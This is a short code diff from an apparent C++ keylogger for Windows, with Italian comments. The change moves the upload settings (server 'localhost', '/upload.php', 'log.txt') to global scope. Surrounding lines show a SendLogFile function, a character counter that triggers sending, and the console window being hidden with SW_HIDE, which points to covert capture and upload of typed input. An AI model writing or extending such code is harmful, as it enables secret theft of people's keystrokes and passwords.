@@ -24,16 +24,15 @@ bool SendLogFile(const string& server, const string& path, const string& logfile
 wstring ConvertToWide(const string& str);
 //converte una stringa normale in una wide string (vedi commenti)
 
+string address = "localhost";
+string page = "/upload.php"; //basta una semplice pagina per caricare i file
+string fileName = "log.txt";
 
 int main(){
 
     ofstream file;
     int counter = 0;
     const int sendToNChars = 10;
-
-    string address = "localhost";
-    string page = "/upload.php"; //basta una semplice pagina per caricare i file
-    string fileName = "log.txt";
 
     HWND hwnd = GetConsoleWindow(); //ottiene la finestra della console
     ShowWindow(hwnd, SW_HIDE);      //la nasconde
